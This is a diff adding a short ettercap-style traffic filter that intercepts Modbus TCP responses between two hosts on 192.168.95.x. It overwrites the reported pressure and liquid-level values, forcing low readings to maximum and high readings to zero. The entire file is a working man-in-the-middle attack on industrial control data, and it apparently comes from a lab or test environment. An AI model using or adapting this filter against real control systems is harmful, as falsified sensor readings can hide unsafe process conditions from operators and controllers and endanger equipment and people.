@@ -1,0 +1,25 @@
+# when pressure/liquid is below 32000, manipulate reading to
+# 65535, otherwise manipulate to 0
+
+if (ip.src == '192.168.95.14' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        
+        # pressure
+        if (DATA.data + 9 < 0x7D) {
+            DATA.data + 9 = 0xff;
+            DATA.data + 10 = 0xff;
+        } else {
+            DATA.data + 9 = 0x00;
+            DATA.data + 10 = 0x00;
+        }
+
+        # liquid level
+        if (DATA.data + 11 < 0x7D) {
+            DATA.data + 11 = 0xff;
+            DATA.data + 12 = 0xff;
+        } else {
+            DATA.data + 11 = 0x00;
+            DATA.data + 12 = 0x00;
+        }
+    }
+}
